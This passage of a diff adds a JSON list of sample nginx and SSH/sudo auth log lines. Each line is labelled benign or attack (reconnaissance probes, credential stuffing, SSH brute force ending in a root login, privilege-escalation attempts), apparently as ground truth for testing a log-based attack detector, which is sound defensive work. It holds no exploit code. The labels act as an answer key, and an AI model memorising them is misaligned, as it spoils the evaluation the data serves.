+  "subtle": true
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 28,
+  "line": "203.0.113.42 - - [23/May/2026:08:35:06 +0000] \"GET /actuator/env HTTP/1.1\" 404 64 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "RECON",
+  "subtle": true
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 29,
+  "line": "203.0.113.42 - - [23/May/2026:08:35:07 +0000] \"GET /admin/config HTTP/1.1\" 401 128 \"-\" \"Mozilla/5.0\"",
+  "label": "attack",
+  "attack": "RECON",
+  "subtle": true
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 30,
+  "line": "185.220.101.1 - - [23/May/2026:08:40:00 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"python-requests/2.28\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 31,
+  "line": "185.220.101.1 - - [23/May/2026:08:40:01 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"python-requests/2.28\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 32,
+  "line": "185.220.101.1 - - [23/May/2026:08:40:02 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"python-requests/2.28\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 33,
+  "line": "185.220.101.1 - - [23/May/2026:08:40:03 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"python-requests/2.28\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 34,
+  "line": "185.220.101.1 - - [23/May/2026:08:40:04 +0000] \"POST /api/login HTTP/1.1\" 200 512 \"-\" \"python-requests/2.28\"",
+  "label": "attack",
+  "attack": "CRED_STUFFING",
+  "subtle": true
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 35,
+  "line": "10.0.0.10 - - [23/May/2026:08:45:00 +0000] \"GET /api/products HTTP/1.1\" 200 4096 \"-\" \"Mozilla/5.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 36,
+  "line": "10.0.0.10 - - [23/May/2026:08:45:10 +0000] \"POST /api/cart HTTP/1.1\" 200 256 \"-\" \"Mozilla/5.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "sample_nginx",
+  "idx": 37,
+  "line": "10.0.0.11 - - [23/May/2026:08:45:20 +0000] \"GET /api/orders/12345 HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
+  "label": "benign",
+  "attack": null,
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 0,
+  "line": "May 23 08:25:01 prod-server sshd[12345]: Failed password for invalid user admin from 203.0.113.42 port 54321 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 1,
+  "line": "May 23 08:25:02 prod-server sshd[12345]: Failed password for invalid user admin from 203.0.113.42 port 54322 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 2,
+  "line": "May 23 08:25:03 prod-server sshd[12345]: Failed password for invalid user admin from 203.0.113.42 port 54323 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 3,
+  "line": "May 23 08:25:04 prod-server sshd[12345]: Failed password for invalid user admin from 203.0.113.42 port 54324 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 4,
+  "line": "May 23 08:25:05 prod-server sshd[12345]: Failed password for invalid user admin from 203.0.113.42 port 54325 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 5,
+  "line": "May 23 08:25:06 prod-server sshd[12345]: Failed password for invalid user root from 203.0.113.42 port 54326 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 6,
+  "line": "May 23 08:25:07 prod-server sshd[12345]: Failed password for invalid user root from 203.0.113.42 port 54327 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 7,
+  "line": "May 23 08:25:08 prod-server sshd[12345]: Failed password for invalid user root from 203.0.113.42 port 54328 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 8,
+  "line": "May 23 08:25:09 prod-server sshd[12345]: Failed password for invalid user ubuntu from 203.0.113.42 port 54329 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 9,
+  "line": "May 23 08:25:10 prod-server sshd[12345]: Failed password for invalid user ubuntu from 203.0.113.42 port 54330 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 10,
+  "line": "May 23 08:25:15 prod-server sshd[12345]: Failed password for invalid user pi from 203.0.113.42 port 54331 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 11,
+  "line": "May 23 08:25:20 prod-server sshd[99999]: Accepted password for root from 203.0.113.42 port 54332 ssh2",
+  "label": "attack",
+  "attack": "BRUTE_FORCE",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 12,
+  "line": "May 23 08:30:00 prod-server sudo: pam_unix(sudo:auth): authentication failure; logname= uid=1001 euid=0 ruser=developer rhost= user=root",
+  "label": "attack",
+  "attack": "PRIV_ESC",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 13,
+  "line": "May 23 08:30:10 prod-server su: pam_unix(su:auth): failed su for root by developer",
+  "label": "attack",
+  "attack": "PRIV_ESC",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 14,
+  "line": "May 23 08:30:20 prod-server sudo: developer : TTY=pts/1 ; PWD=/home/developer ; USER=root ; COMMAND=/bin/bash",
+  "label": "attack",
+  "attack": "PRIV_ESC",
+  "subtle": false
+ },
+ {
+  "file": "sample_auth",
+  "idx": 15,
+  "line": "May 23 08:30:25 prod-server sudo: pam_unix(sudo:auth): authentication failure; logname= uid=1002 euid=0 ruser=jenkins rhost= user=root",
+  "label": "attack",
+  "attack": "PRIV_ESC",
+  "subtle": false
+ }
+]
